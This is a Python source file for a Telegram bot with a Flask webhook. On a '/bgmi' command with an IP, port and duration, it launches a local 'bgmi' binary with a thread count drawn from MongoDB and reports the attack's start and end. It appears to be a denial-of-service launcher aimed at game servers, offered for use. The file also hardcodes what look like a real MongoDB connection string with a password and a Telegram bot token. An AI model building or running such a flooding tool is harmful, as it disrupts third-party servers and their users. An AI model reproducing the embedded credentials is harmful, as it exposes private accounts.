import subprocess
import time
import os
from flask import Flask, request
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient
import random

# MongoDB connection string (AWS MongoDB)
MONGO_URI = "mongodb+srv://shaikhhamza2287:HAMZA@cluster0.3akqj.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URI)
db = client["bgmi_db"]
collection = db["bgmi_config"]

# Binary file path for bgmi
BINARY_FILE = "./bgmi"

# Flask app
flask_app = Flask(__name__)
WEBHOOK_PORT = random.randint(5000, 9000)  # Choose a random port
WEBHOOK_URL = None  # This will be updated dynamically

# Function to fetch thread count from MongoDB
def get_thread_count():
    config = collection.find_one({"_id": 1})
    return config["thread_count"] if config else 400

# Start attack command handler
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Parse user input: /bgmi ip port time
        args = context.args
        if len(args) != 3:
            await update.message.reply_text("Usage: /bgmi <ip> <port> <time>")
            return

        ip, port, duration = args
        thread_count = get_thread_count()

        # Construct the command to execute the bgmi binary with IP, port, time, and thread count
        command = [BINARY_FILE, ip, port, duration, str(thread_count)]

        # Notify the user that the attack has started
        await update.message.reply_text(f"Attack started on {ip}:{port} for {duration} seconds.")

        # Run the bgmi binary
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(int(duration))  # Wait for the duration of the attack
        process.terminate()  # Terminate the process after attack duration

        # Notify the user that the attack has finished
        await update.message.reply_text("Attack finished.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# Flask route to handle webhook updates
@flask_app.route("/webhook", methods=["POST"])
def webhook():
    json_data = request.get_json(force=True)  # Get JSON data from the request
    update = Update.de_json(json_data, bot)
    app.process_update(update)
    return "OK", 200

# Main function to initialize bot and Flask server
async def main():
    global WEBHOOK_URL, bot, app

    # Your Telegram bot token
    BOT_TOKEN = "7927936963:AAFq1NC73Fch4S539phJA__oPcj8WFlFkwA"

    # Initialize the Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()
    bot = app.bot

    # Add command handler for the /bgmi command
    app.add_handler(CommandHandler("bgmi", start_attack))

    # Dynamically set the webhook URL
    hostname = os.getenv("HOSTNAME", "localhost")  # Replace 'localhost' with your domain if needed
    WEBHOOK_URL = f"http://{hostname}:{WEBHOOK_PORT}/webhook"

    # Set the Telegram webhook
    await app.bot.set_webhook(WEBHOOK_URL)

    # Run the Flask server
    print(f"Starting Flask server on port {WEBHOOK_PORT}")
    flask_app.run(host="0.0.0.0", port=WEBHOOK_PORT)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
